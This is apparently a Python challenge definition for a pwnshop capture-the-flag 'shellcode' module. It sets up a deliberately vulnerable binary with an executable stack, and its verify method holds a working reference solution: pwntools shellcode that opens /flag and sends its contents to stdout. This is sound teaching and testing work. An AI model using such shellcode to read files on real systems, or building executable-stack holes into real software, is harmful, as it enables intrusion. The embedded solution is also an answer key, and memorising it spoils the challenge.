import pwnshop
import pwn
import os

class ShellBase(pwnshop.Challenge):
    TEMPLATE_PATH = "example_shell.c"
    EXEC_STACK = True
    CANARY = True
    LINK_LIBRARIES = ["capstone"]

    stack_shellcode = False
    shellcode_size = 0x1000
    allocation_size = 0x1000
    remap_rx_size = 0x0
    shellcode_filter = None
    close_stdin = False
    close_stdout = False
    close_stderr = False

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.shellcode_address = self.random.randrange(0x13370000, 0x31337000, 0x1000)

class ShellExample(ShellBase):
    """
    Write and execute shellcode to read the flag!
    """

    stack_shellcode = True
    shellcode_size = 0x1000
    allocation_size = 0x1000

    def verify(self, binary=None):
        """
        Read 0x1000 bytes onto the stack (address varies every time that it is run)
        """
        with super().verify(binary) as process:
            shellcode = pwn.asm(
                pwn.shellcraft.open("/flag") + pwn.shellcraft.sendfile(1, 3, 0, 1024)
            )
            process.write(shellcode)
            assert self.flag in process.readall()

pwnshop.register_challenge(ShellExample)

NUM_TESTING=0
DOJO_MODULE="shellcode"
